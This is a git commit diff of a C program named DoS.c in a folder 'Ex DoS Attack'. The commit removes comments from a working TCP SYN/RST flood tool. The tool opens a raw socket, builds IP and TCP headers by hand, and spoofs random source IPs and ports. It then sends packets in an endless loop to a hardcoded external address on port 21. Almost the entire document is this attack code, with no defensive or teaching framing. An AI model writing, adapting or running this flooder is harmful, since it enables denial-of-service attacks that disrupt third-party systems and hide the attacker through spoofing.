4e0782ec632ba1235fcefb157f87f2ed2a31f832
Vinicius Teixeira <99350364+viniciushammett@users.noreply.github.com>
2022-10-09 02:15:38 -0300

    update
    update

--- Ex DoS Attack/DoS.c
+++ Ex DoS Attack/DoS.c
@@ -19,7 +19,7 @@ int countOfPacket = 0;
 int sending = 1;
 char source_ip[32];
 
-struct pseudo_header // for checksum calculation
+struct pseudo_header 
 {
   unsigned int source_address;
   unsigned int dest_address;
@@ -30,13 +30,13 @@ struct pseudo_header // for checksum calculation
   struct tcphdr tcp;
 };
 
-// random number for port spoofing(0-65535)
+
 int randomPort() { return rand() % 65535; }
 
-// random number for IP spoofing(0-255)
+
 int randomForIp() { return rand() % 255; }
 
-// IP spoofer
+
 char *randomIp() {
   strcpy(source_ip, "");
   int dots = 0;
@@ -56,7 +56,7 @@ int validIp(char *ip) {
   return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
 }
 
-// interrupt for Ctrl+C command
+
 void sigintHandler(int sig) {
   sending = 0;
   printf("\n%d [DATA] packets sent\n", countOfPacket);
@@ -91,8 +91,8 @@ int main(int argc, char *argv[]) {
   int flagSyn = 1;
   int opt = 0;
 
-  srand(time(0));                // gives the random function a new seed
-  signal(SIGINT, sigintHandler); // send interrupt for  Ctrl+C command
+  srand(time(0));               
+  signal(SIGINT, sigintHandler); 
 
   while ((opt = getopt(argc, argv, "t:p:r")) != -1) {
     switch (opt) {
@@ -121,62 +121,58 @@ int main(int argc, char *argv[]) {
   }
   printf("[DATA] Flood is starting...\n");
 
-  // Create a raw socket
+  
   int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
-  // Datagram to represent the packet
+  
   char datagram[4096];
 
-  // IP header
+ 
   struct iphdr *iph = (struct iphdr *)datagram;
 
-  // TCP header
+  
   struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
   struct sockaddr_in sin;
   struct pseudo_header psh;
 
-  sin.sin_addr.s_addr = inet_addr("37.59.174.225"); // set destination ip
-  sin.sin_port = htons(21);                      // socket port
-  sin.sin_family = AF_INET;                        // set to ipv4
+  sin.sin_addr.s_addr = inet_addr("37.59.174.225"); 
+  sin.sin_port = htons(21);                     
+  sin.sin_family = AF_INET;                       
 
-  memset(datagram, 0, 4096); /* clean the buffer */
+  memset(datagram, 0, 4096); 
 
-  // IP Header
-  iph->ihl = 5;                                             // header length
-  iph->version = 4;                                         // Version
-  iph->tos = 0;                                             // Type of service
-  iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); // Total length
-  iph->id = htons(54321);                                   // Id of this packet
-  iph->frag_off = 0;                // Fragmentation offset
-  iph->ttl = 255;                   // Time to live
-  iph->protocol = IPPROTO_TCP;      // Protocol tcp
-  iph->check = 0;                   // Set to 0 before calculating checksum
-  iph->daddr = sin.sin_addr.s_addr; // set source IP
+  
+  iph->ihl = 5;                                             
+  iph->version = 4;                                         
+  iph->tos = 0;                                            
+  iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
+  iph->id = htons(54321);                                   
+  iph->frag_off = 0;                
+  iph->ttl = 255;                   
+  iph->protocol = IPPROTO_TCP;      
+  iph->check = 0;                   
+  iph->daddr = sin.sin_addr.s_addr; 
 
-  // TCP Header
-  tcph->dest = htons(destination_port); // Destination port
-  tcph->seq = 0;                        // Sequence number
+  
+  tcph->dest = htons(destination_port); 
+  tcph->seq = 0;                        
   tcph->ack_seq = 0;
-  tcph->doff = 5; /* Data offset */
+  tcph->doff = 5;
   tcph->fin = 0;
   tcph->syn = flagSyn;
   tcph->rst = flagRst;
   tcph->psh = 0;
   tcph->ack = 0;
   tcph->urg = 0;
-  tcph->window = htons(5840); /* maximum window size */
+  tcph->window = htons(5840); 
   tcph->urg_ptr = 0;
 
-  // IP checksum
+ 
   psh.dest_address = sin.sin_addr.s_addr;
   psh.placeholder = 0;
   psh.protocol = IPPROTO_TCP;
   psh.tcp_length = htons(20);
 
-  // tells the kernel that the IP header is included so it will fill the data
-  // link layer information.
-  // Ethernet header IP_HDRINCL to tell the kernel that headers are included
-  // in the packet
   int one = 1;
   const int *val = &one;
   if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
@@ -191,32 +187,27 @@ int main(int argc, char *argv[]) {
          destination_ip, destination_port, flagRst);
 
   while (sending) {
-    iph->saddr = inet_addr(randomIp()); // random ip the source ip address
+    iph->saddr = inet_addr(randomIp()); 
     iph->check = checksum((unsigned short *)datagram,
-                          iph->tot_len >> 1); /* checksum for ip header*/
+                          iph->tot_len >> 1);
 
     psh.source_address =
-        inet_addr(source_ip); /*update source ip in IP checksum*/
+        inet_addr(source_ip); 
 
-    tcph->source = htons(randomPort()); /*random spoof port */
-    tcph->check = 0;                    /*checksum is set to zero */
+    tcph->source = htons(randomPort()); 
+    tcph->check = 0;                   
 
     memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
 
     tcph->check =
         checksum((unsigned short *)&psh,
-                 sizeof(struct pseudo_header)); /* checksum for tcp header*/
-    /*
-    Send the packet:our socket,the buffer containing headers and data,total
-    length of our datagram,routing flags, normally always 0,socket addr, just
-    like in,a normal send()
-    */
+                 sizeof(struct pseudo_header)); 
+   
     if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin,
                sizeof(sin)) < 0) {
       printf("\n[ERROR] Program terminated\n");
       exit(1);
     } else {
-      // sent successfully
       countOfPacket++;
     }
   }
